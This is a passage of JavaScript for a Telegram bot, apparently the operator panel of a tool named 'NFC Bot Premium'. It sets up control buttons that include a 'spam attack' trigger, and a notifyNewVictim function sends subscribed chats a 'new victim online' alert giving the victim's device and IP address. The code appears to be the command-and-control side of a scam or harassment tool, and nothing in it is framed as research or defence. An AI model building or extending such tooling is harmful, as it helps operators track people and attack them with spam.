            { text: '☢️ Спам-атака', callback_data: `bomb_${sessionId}` }
        ],
        [
            { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}`, callback_data: `auto_${sessionId}` },
            { text: 'ℹ️ Подробнее', callback_data: `info_${sessionId}` }
        ],
        [
            { text: '🖼 Изменить фон', callback_data: `edit_image_${sessionId}` },
            { text: '🔊 Изменить звук', callback_data: `edit_sound_${sessionId}` }
        ],
        [
            { text: '❌ Удалить сессию', callback_data: `del_${sessionId}` }
        ]
    ];

    const panelMsg = await bot.sendMessage(chatId, statusText, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    }).catch(err => {
        console.error('Ошибка отправки панели:', err.message);
        return null;
    });
    
    if (panelMsg) {
        saveMessageId(chatId, panelMsg.message_id);
        
        // Сохраняем привязку сессии к чату для уведомлений
        if (!s.subscribedChats) {
            s.subscribedChats = [];
        }
        if (!s.subscribedChats.includes(chatId)) {
            s.subscribedChats.push(chatId);
        }
    }
}

// --- УВЕДОМЛЕНИЕ О НОВОЙ ЖЕРТВЕ ---
function notifyNewVictim(sessionId, victimInfo) {
    const s = global.sessions[sessionId];
    if (!s || !s.subscribedChats) return;
    
    const notificationText = `
🎯 <b>Новая жертва онлайн!</b>

🆔 Сессия: <code>${s.shortCode}</code>
📱 Устройство: ${victimInfo.device}
🌐 IP: ${victimInfo.ip}
⏰ Время: ${new Date().toLocaleTimeString('ru-RU')}`;

    // Отправляем уведомление всем подписанным чатам
    s.subscribedChats.forEach(async (chatId) => {
        try {
            await deleteOldMessages(chatId);
            const notifMsg = await bot.sendMessage(chatId, notificationText, { parse_mode: 'HTML' });
            saveMessageId(chatId, notifMsg.message_id);
            
            // Отправляем обновленную панель
            setTimeout(() => sendControlPanel(chatId, sessionId), 500);
        } catch (e) {
            console.error('Ошибка отправки уведомления:', e.message);
        }
    });
}

// Экспортируем для использования в server.js
module.exports = { bot, notifyNewVictim };

// --- ОБРАБОТКА ОШИБОК ---
bot.on('polling_error', (error) => {
    console.error('Polling error:', error.message);
});

bot.on('error', (error) => {
    console.error('Bot error:', error.message);
});

console.log('✅ NFC Bot Premium готов к работе!');
